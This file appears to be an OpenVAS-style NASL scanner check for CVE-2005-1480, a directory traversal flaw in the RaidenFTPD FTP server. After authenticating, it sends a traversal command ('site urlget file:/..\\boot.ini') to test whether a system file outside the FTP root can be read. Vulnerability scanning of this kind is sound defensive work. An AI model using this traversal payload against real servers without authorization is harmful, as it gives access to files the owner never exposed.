if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.18225" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_cve_id( "CVE-2005-1480" );
	script_bugtraq_id( 13292 );
	script_xref( name: "OSVDB", value: "15713" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "RaidenFTPD Unauthorized File Access flaw" );
	script_category( ACT_GATHER_INFO );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2005 David Maciejak" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_keys( "ftp/login" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/raidenftpd/detected" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "Upgrade to 2.4 build 2241 or newer." );
	script_tag( name: "summary", value: "The remote host is running the RaidenFTPD FTP server.

  The remote version of this software is vulnerable to a directory
  traversal flaw." );
	script_tag( name: "impact", value: "A malicious user could exploit it to obtain read
  access to the outside of the intended ftp root." );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = ftp_get_port( default: 21 );
kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
password = kb_creds["pass"];
if(!login || !password){
	exit( 0 );
}
banner = ftp_get_banner( port: port );
if(!banner || !egrep( pattern: ".*RaidenFTPD.*", string: banner )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(soc){
	ftp_recv_line( socket: soc );
	if(ftp_authenticate( socket: soc, user: login, pass: password )){
		s = NASLString( "quote site urlget file:/..\\\\boot.ini\\r\\n" );
		send( socket: soc, data: s );
		r = ftp_recv_line( socket: soc );
		if(ContainsString( r, "220 site urlget " )){
			security_message( port );
		}
	}
	close( soc );
}

